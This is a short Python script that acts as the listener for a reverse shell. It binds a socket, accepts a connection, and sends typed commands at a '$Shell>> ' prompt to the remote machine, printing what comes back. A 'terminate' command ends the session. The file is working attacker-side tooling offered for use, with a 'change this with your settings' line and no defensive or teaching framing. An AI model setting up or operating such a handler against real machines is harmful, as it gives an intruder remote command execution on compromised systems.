import socket

### CHANGE THIS WITH YOUR SETTINGS
IP = '127.0.0.1'
PORT = 1995


def connect():
    s = socket.socket()
    s.bind((IP,PORT))
    s.listen(1)
    conn, addr = s.accept()
    print(f"GOT: {conn}:{addr}")
    while True:
        command = input("$Shell>> ")

        if command == "":
            command = "id"
            conn.send(command.encode())
            print(f"Data GOT: {conn.recv(1024).decode()}")

        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break #exit while
        else: 
            conn.send(command.encode())
            print(f"Data GOT: {conn.recv(1024).decode()}")


def main():
    connect()


if __name__ == "__main__":
    main()
